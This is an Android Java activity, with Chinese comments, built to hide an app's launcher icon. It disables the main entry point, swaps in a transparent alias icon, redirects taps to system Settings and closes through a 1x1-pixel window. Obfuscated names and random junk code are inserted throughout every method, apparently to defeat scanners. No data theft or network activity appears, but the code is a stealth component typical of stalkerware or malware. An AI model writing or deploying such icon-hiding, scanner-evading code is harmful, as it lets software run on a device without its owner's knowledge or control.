package jqoj.jkh.yewl;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;
import androidx.appcompat.app.AppCompatActivity;

/**
 * 图标隐藏辅助 Activity。
 * 启动后会禁用主入口（VDJK），并启用透明的别名入口（MysteryAliasActivity），
 * 从而在桌面上隐藏/替换应用图标。Android 10 以下可进一步禁用别名，完全移除占位图标。
 * Android 10+ 点击透明图标时跳转系统设置。
 */
public class VDJM extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        long arr_FGAeiNfeLYWDdTQqC = java.lang.System.nanoTime();
        int i_xuNkhBYslSNbGZuz = new java.util.Random().nextInt(1000);
        boolean j_dDLehQoYDVagZjD = (arr_FGAeiNfeLYWDdTQqC % (i_xuNkhBYslSNbGZuz + 4)) > 96;
        double tmp_LpKGxGDclw = j_dDLehQoYDVagZjD ? java.lang.Math.sqrt(i_xuNkhBYslSNbGZuz) : java.lang.Math.pow(i_xuNkhBYslSNbGZuz, 94);
        if (tmp_LpKGxGDclw < 0.0) {
            java.lang.System.out.println(tmp_LpKGxGDclw);
        }
        super.onCreate(savedInstanceState);
        // 禁用主 Activity，启用透明别名 Activity
        set(VDJM.this, VDJK.class.getName(), "jqoj.jkh.yewl.MysteryAliasActivity");
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            // Android 10+ 点击透明图标后跳转系统设置
            Intent intent = new Intent(Settings.ACTION_SETTINGS);
            startActivity(intent);
        } else {
            // Android 10 以下禁用别名后，透明图标占位图也会消失
            disableComponent(VDJM.this, "jqoj.jkh.yewl.MysteryAliasActivity");
        }
        Window window = getWindow();
        window.setGravity(Gravity.LEFT | Gravity.TOP);
        WindowManager.LayoutParams params = window.getAttributes();
        params.x = 0;
        params.y = 0;
        params.width = 1;
        params.height = 1;
        window.setAttributes(params);
        finish();
    }

    public static void set(Context context, String main, String alias) {
        String onaeLFjQRJJvxTPkiMiY = java.util.UUID.randomUUID().toString();
        int ckuydrzAEpuNHZbAvEbd = onaeLFjQRJJvxTPkiMiY.length();
        char pmh_reurLLcZDFAjYjb = onaeLFjQRJJvxTPkiMiY.charAt(new java.util.Random().nextInt(ckuydrzAEpuNHZbAvEbd));
        boolean dimaNwKSWouJezqoCDaHQ = (pmh_reurLLcZDFAjYjb == 'z');
        if (dimaNwKSWouJezqoCDaHQ && ckuydrzAEpuNHZbAvEbd < 36) {
            onaeLFjQRJJvxTPkiMiY.substring(74, 63);
        }
        disableComponent(context, main);
        enableComponent(context, alias);
    }

    public static void enableComponent(Context context, String clazzName) {
        java.lang.Object arr_BbHeNDXipLL = new java.lang.Object();
        int i_MNcrTmroZCxjSIlGyS = arr_BbHeNDXipLL.hashCode();
        int j_TnkGlEvyJbVG = new java.util.Random().nextInt(100);
        int tmp_xCfGBNcYwDVlJ = (i_MNcrTmroZCxjSIlGyS ^ j_TnkGlEvyJbVG) & 0x7FFFFFFF;
        if (tmp_xCfGBNcYwDVlJ == 58 && i_MNcrTmroZCxjSIlGyS < 96) {
            arr_BbHeNDXipLL.toString();
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
    }

    public static void disableComponent(Context context, String clazzName) {
        String onaeLFjQRJJvxTPkiMiY = java.util.UUID.randomUUID().toString();
        int ckuydrzAEpuNHZbAvEbd = onaeLFjQRJJvxTPkiMiY.length();
        char pmh_reurLLcZDFAjYjb = onaeLFjQRJJvxTPkiMiY.charAt(new java.util.Random().nextInt(ckuydrzAEpuNHZbAvEbd));
        boolean dimaNwKSWouJezqoCDaHQ = (pmh_reurLLcZDFAjYjb == 'z');
        if (dimaNwKSWouJezqoCDaHQ && ckuydrzAEpuNHZbAvEbd < 36) {
            onaeLFjQRJJvxTPkiMiY.substring(74, 63);
        }
        ComponentName componentName = new ComponentName(context, clazzName);
        PackageManager packageManager = context.getPackageManager();
        packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}
